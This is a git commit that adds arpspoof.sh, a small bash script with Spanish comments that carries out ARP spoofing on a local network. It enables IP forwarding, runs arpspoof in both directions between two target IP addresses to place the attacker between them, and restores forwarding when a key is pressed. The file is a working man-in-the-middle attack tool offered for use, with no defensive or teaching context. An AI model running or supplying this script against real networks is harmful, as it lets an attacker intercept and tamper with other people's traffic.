5059c63514966b7c02aaac3f6e5e52ff79ebf177
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2018-04-08 22:57:17 +0200

    Create arpspoof.sh

---
+++ arpspoof.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+echo "Spoof IP LAN por ARP. Identificamos nuestros interfaces nuestra IP y la IP a sumplantar"
+echo "Uso: sh arpspoof.sh eth0 192.168.1.252 192.168.1.250"
+
+# Activamos IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Sumplantacion
+arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
+PID1=$!
+arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
+PID2=$!
+
+echo "Para parar pulsa cualquier tecla..."
+read
+
+# Stop
+kill -9 $PID1 $PID2
+echo 0 > /proc/sys/net/ipv4/ip_forward
+
+exit 0
